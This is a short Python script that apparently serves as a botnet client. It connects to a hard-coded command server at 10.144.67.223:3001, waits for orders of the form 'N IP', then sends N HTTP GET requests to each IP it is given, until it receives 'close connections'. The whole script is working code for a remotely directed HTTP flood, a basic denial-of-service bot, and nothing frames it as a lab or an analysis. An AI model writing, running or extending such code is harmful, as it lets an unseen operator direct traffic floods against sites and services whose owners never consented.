import socket
import requests

# Connect to the server's socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('10.144.67.223', 3001))

while True:
    # Receive message from the server
    message = sock.recv(1024).decode()

    # Check if the message is in the format "N IP"
    parts = message.split()
    if len(parts) == 2 and parts[0].isdigit():
        n = int(parts[0])
        ip = parts[1]

        # Send N number of HTTP requests to the IP address
        for _ in range(n):
            response = requests.get(f'http://{ip}')
            print(f'Sent HTTP request to {ip}. Response: {response.status_code}')

    # Check if the message is "close connections"
    if message == "close connections":
        sock.close()
        break
